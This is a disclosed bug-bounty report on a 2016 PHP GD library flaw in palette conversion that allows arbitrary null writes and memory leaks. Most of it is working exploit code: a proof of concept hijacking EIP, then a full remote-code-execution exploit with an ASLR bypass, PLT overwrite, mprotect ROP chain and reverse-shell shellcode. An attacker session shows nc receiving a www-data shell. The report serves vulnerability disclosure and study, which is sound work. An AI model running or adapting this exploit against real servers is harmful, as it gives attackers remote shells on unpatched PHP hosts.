# gdImageTrueColorToPaletteBody allows arbitrary write/read access

## Report Details
- **Report ID**: 153776
- **URL**: https://hackerone.com/reports/153776
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-25T18:46:54.446Z
- **Disclosed**: 2019-10-31T06:16:54.634Z

## Reporter
- **Username**: fms
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Upstream bug report
================
2016-06-29 04:03 UTC
https://bugs.php.net/bug.php?id=72512


Patch
=====
2016-07-19 07:47 UTC
http://git.php.net/?p=php-src.git;a=commit;h=928aecc002e906b309b28f0062f03d4e5eda3e45
Fixed for PHP 5.5 (security only mode), PHP 5.6, PHP 7.0
http://php.net/ChangeLog-5.php#5.5.38
http://php.net/ChangeLog-5.php#5.6.24
http://php.net/ChangeLog-7.php#7.0.9

Description
=========
gdImageTrueColorToPaletteBody doesn't check for negative transparent colors while converting the image. This leads to arbitrary null write and information leak.

Details
=======
https://github.com/php/php-src/blob/master/ext/gd/libgd/gd_topal.c#L2000

```
...
if (oim->transparent >= 0)
{
 nim->transparent = nim->colorsTotal;
 nim->colorsTotal++;
}
...
```
nim->transparent will only be updated with a valid index if oim->transparent is bigger than 0, however it can be set to be a negative color using gdImageColorTransparent

https://github.com/php/php-src/blob/master/ext/gd/libgd/gd.c#L598
```
void gdImageColorTransparent (gdImagePtr im, int color)
{
       if (!im->trueColor) {
               if (im->transparent != -1) {
                       im->alpha[im->transparent] = gdAlphaOpaque;
               }
               if (color > 1 && color < im>colorsTotal && color < gdMaxColors) {
                       im->alpha[color] = gdAlphaTransparent;
               } else {
                       return;
               }
       }
       im->transparent = color;
}
```
As you can see here, there's no check for color on truecolor images.  

Arbitrary Null Write
----------------------------
Setting im->transparent to a negative value, and then converting it to palette will allow to write an arbitrary null using gdImageColorTransparent again (above function):
```
       im->alpha[im->transparent] = gdAlphaOpaque;
```

Leak arbitrary memory using imagescale:
---------------------------------------------------------
https://github.com/php/php-src/blob/master/ext/gd/libgd/gd_interpolation.c#L1247 
```
static gdImagePtr gdImageScaleBilinearPalette(gdImagePtr im, const unsigned int new_width, const unsigned int new_height)
{
...
        new_img->transparent = gdTrueColorAlpha(im->red[transparent], im->green[transparent], im->blue[transparent], im->alpha[transparent]);   # transparent out of bounds
...
}
```
new_img->transparent value is calculated adding the values using transparent as an index.

EIP control
--------------
We are able to control EIP register by abusing these two issues:
```
<?php
ini_set('memory_limit', -1);

/*
objdump -d /home/user/php/php-70/sapi/cli/php|grep -A 2 strlen@plt

08065ce0 <strlen@plt>:
 8065ce0:       ff 25 c0 72 b4 08       jmp    *0x8b472c0
 8065ce6:       68 68 05 00 00          push   $0x568

*/
$plt_strlen = 0x8b472c0;

$img = imagecreatetruecolor($plt_strlen + 0x10, 1);  // Image with enough width to reach plt_strlen address
imagecolortransparent($img, -24060);    // Constant offset to reach first element from array img->pixels
imagetruecolortopalette($img, TRUE, 3);
imagecolortransparent($img, 0xff);     // Set to null first element from img->pixels  

// Allocate palette colors
for ($i = 0; $i < 256; $i++) imagecolorallocatealpha($img, $i, $i, $i, $i);

// Overwrite strlen plt address with 0x44434241
imagesetpixel($img, $plt_strlen, 0, 0x41);
imagesetpixel($img, $plt_strlen+1, 0, 0x42);
imagesetpixel($img, $plt_strlen+2, 0, 0x43);
imagesetpixel($img, $plt_strlen+3, 0, 0x44);
```

GDB output:
```
gdb -q --args /home/user/php/php-70/sapi/cli/php poc3.php
No symbol table is loaded.  Use the "file" command.
Breakpoint 1 (__asan_report_error) pending.
Reading symbols from /home/user/php/php-70/sapi/cli/php...done.
gdb-peda$ r
Starting program: /home/user/php/php-70/sapi/cli/php poc3.php

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x8b91660 ("text/html")
EBX: 0x8b47000 --> 0x8b46db8 --> 0x1 
ECX: 0xee50aaae 
EDX: 0xffffbe98 --> 0x8b47000 --> 0x8b46db8 --> 0x1 
ESI: 0x8b47000 --> 0x8b46db8 --> 0x1 
EDI: 0x8b7a518 --> 0x0 
EBP: 0xffffba38 --> 0xffffbb98 --> 0xffffbba8 --> 0xffffbbb8 --> 0xffffbbd8 --> 0xffffc2e8 (--> ...)
ESP: 0xffffb9fc --> 0x83e6d0e (<get_default_content_type+70>:	add    esp,0x10)
EIP: 0x44434241 ('ABCD')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x44434241
[------------------------------------stack-------------------------------------]
0000| 0xffffb9fc --> 0x83e6d0e (<get_default_content_type+70>:	add    esp,0x10)
0004| 0xffffba00 --> 0x8b91660 ("text/html")
0008| 0xffffba04 --> 0x0 
0012| 0xffffba08 --> 0x8a62758 ("/home/user/php/php-70/Zend/zend_hash.c")
0016| 0xffffba0c --> 0x83e6cd4 (<get_default_content_type+12>:	add    ebx,0x76032c)
0020| 0xffffba10 --> 0x0 
0024| 0xffffba14 --> 0x8474df1 (<zend_hash_iterators_remove+8>:	add    eax,0x6d220f)
0028| 0xffffba18 --> 0x8b91660 ("text/html")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x44434241 in ?? ()
gdb-peda$ 
```
Code execution
--------------
```
<?php
// Tested on Debian x86 Jessie update + NGINX + PHP-FPM

/*
 objdump -d /usr/sbin/php5-fpm |grep -A 2 write|more

08096b50 <write@plt>:
 8096b50:       ff 25 a4 93 96 08       jmp    *0x89693a4
 8096b56:       68 30 07 00 00          push   $0x730

*/

$plt_write = 0x89693a4;

function get_maps() {
        $fh = fopen("/proc/self/maps", "r");
        $maps = fread($fh, 31337);
        fclose($fh);
        return explode("\n", $maps);
}

// Fill heap with nulled basic gdImage structures
$imgs = array();
for ($i = 0; $i < 10; $i++) $imgs[$i] = imagecreatetruecolor(10, 10);

// Image with enough width to reach plt_write address
$evilimg = imagecreatetruecolor($plt_write + 10, 1);

// Set brush at last gdImage to leak evilimg address
imagesetbrush ($imgs[9], $evilimg);

// -516 : offset to reach **evilimg->pixels pointer
imagecolortransparent($evilimg, -516);
imagetruecolortopalette($evilimg, TRUE, 3);

// Data leak from **evilimg->pixels address trough imagescale bug 
$imgtmp = imagescale($evilimg, 10, 10);
$x1 = imagecolortransparent($imgtmp);
echo "[+] pointer to colors @ 0x".dechex($x1)."\n";


// Restore truecolor evilimg
imagepalettetotruecolor($evilimg);

// -1443 offset to reach brush pointer from img[9] element
imagecolortransparent($evilimg, -1443);

// Data leak from img[9]->brush pointer = evilimg address
imagetruecolortopalette($evilimg, TRUE, 3);
$imgtmp2 = imagescale($evilimg, 10, 10);
$x2 = imagecolortransparent($imgtmp2);

echo "[+] pointer to image @ 0x".dechex($x2)."\n";

// Relative offset to reach first element from **evilimg->pixels (row 1 from image)
$off = -1 * ((($x2 - $x1) / 4) + 1550);
echo "[+] offset @ " . $off ."\n";

// Restore truecolor evilimg
imagepalettetotruecolor($evilimg);

// Set to null first element from evilimg->pixels
imagecolortransparent($evilimg, $off);
imagetruecolortopalette($evilimg, TRUE, 256);
imagecolortransparent($evilimg, 0xff);

// Bypass ASLR
$libc_base = 0;
foreach (get_maps() as $record)
        if (strstr($record, "libc-") && strstr($record, "r-xp")) {
               $libc_base = hexdec(explode('-', $record)[0]);
                break;
        }

if ($libc_base == 0)
        die("[-] can't find libc base, you need an information leak :[");

echo "[+] libc base @ 0x".dechex($libc_base)."\n";

/*
objdump -T /lib/i386-linux-gnu/libc.so.6|grep mprotect
000d4230  w   DF .text  00000037  GLIBC_2.0   mprotect
*/

$mprotect_offset = 0xd4230;
$mprotect_addr = $libc_base + $mprotect_offset;

echo "[+] mprotect @ 0x".dechex($mprotect_addr)."\n";


/* gadgets
pgp5-fpm
0x086ea6d1 : pop ebx ; pop ebx ; aas ; pop ebx ; ret
0x080c5b76 : mov eax, ecx ; ret
0x086d1cf0 : xchg eax, esi ; ret
0x080efd28 : call esi

libc.so
0x00102ec1 : push ecx ; add al, 0x8b ; pop ebp ; cld ; leave ; ret

*/
$pivot_offset = 0x00102ec1;
$pivot =  $libc_base + $pivot_offset;
$pop3 = 0x086ea6d1;

// Overwrite write@plt entry to pivot address
for ($i = 0; $i < 256; $i++) imagecolorallocatealpha($evilimg, $i, $i, $i, $i);
$pivot_str = pack('I', $pivot);
for ($i = 0; $i < strlen($pivot_str); $i++) {
        imagesetpixel($evilimg, $plt_write + $i, 0, ord($pivot_str[$i]));
}


// Allocate shellcode
$pre = get_maps();
$buffer = str_repeat("\x41", 0xff0000);
$post = get_maps();
$tmp = array_diff($post, $pre);
if (count($tmp) != 1)
        die('[-] you need infoleak :[');
$tmp = explode('-',array_values($tmp)[0])[0];
$align = 0xff;
$addr = hexdec($tmp) + 0x18; /* align to string */

echo "[+] buffer string @ 0x".dechex($addr)."\n";

// msfvenom -p linux/x86/shell_reverse_tcp -f python LHOST=10.0.3.1 LPORT=31337
$shellcode = "";
$shellcode .= "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66";
$shellcode .= "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a";
$shellcode .= "\x00\x03\x01\x68\x02\x00\x7a\x69\x89\xe1\xb0\x66\x50";
$shellcode .= "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73";
$shellcode .= "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0";
$shellcode .= "\x0b\xcd\x80";

for ($i = 0; $i < strlen($shellcode); $i++) $buffer[$i] = $shellcode[$i];


echo "[+] building ropchain\n";

// int mprotect(void *addr, size_t len, int prot);

$rop_chain =
	"AAAA" .
        pack('I', $mprotect_addr) /* mprotect */ .
        pack('I', $pop3) /* pop pop pop ret */ .
        pack('I', $addr - 0x18) /* mprotect addr  */ .
        pack('I', 0x1000) /* mprotect len */ .
        pack('I', 0x7) /* mprotect prot */ .
        pack('I', $addr) /* jump to shellcode */ ;


$temp = tmpfile();
// Call to ropchain
fwrite($temp, $rop_chain);
fclose ($temp);
```

Attacker session
```
Call to PHP exploit:
$ lynx http://10.0.3.246/gd4.php
...
$ nc -vlp 31337
Listening on [0.0.0.0] (family 0, port 31337)
Connection from [10.0.3.246] port 31337 [tcp/*] accepted (family 2, sport 44816)
id -a
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


## Attachments
No attachments
